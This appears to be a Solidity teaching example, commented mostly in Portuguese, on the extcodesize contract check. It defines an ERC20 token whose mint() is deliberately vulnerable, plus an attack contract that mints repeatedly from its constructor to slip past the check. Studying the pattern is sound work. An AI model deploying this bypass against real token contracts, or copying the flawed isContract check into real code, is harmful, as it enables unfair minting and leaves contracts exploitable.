// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// Verificando se é um endereço de contrato usando extcodesize
contract ContractCheck is ERC20 {
    // Construtor: inicializa o nome e o código do token
    constructor() ERC20("", "") {}
    
    // Utilizando extcodesize para verificar se é um contrato
    function isContract(address account) public view returns (bool) {
        // extcodesize > 0 的地址一定是合约地址
        // Mas o contrato tem extcodesize igual a 0 no construtor
        uint size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    // função mint, só pode ser chamada por endereços não contratuais (tem uma vulnerabilidade)
    function mint() public {
        require(!isContract(msg.sender), "Contract not allowed!");
        _mint(msg.sender, 100);
    }
}

// Usando as características do construtor para atacar
contract NotContract {
    bool public isContract;
    address public contractCheck;

    // Quando o contrato está sendo criado, o extcodesize (tamanho do código) é 0, portanto não será detectado pelo isContract().
    constructor(address addr) {
        contractCheck = addr;
        isContract = ContractCheck(addr).isContract(address(this));
        // Isso vai funcionar
        for(uint i; i < 10; i++){
            ContractCheck(addr).mint();
        }
    }

    // Após a criação do contrato, se extcodesize > 0, isContract() pode ser usado para verificar
    function mint() external {
        ContractCheck(contractCheck).mint();
    }
}
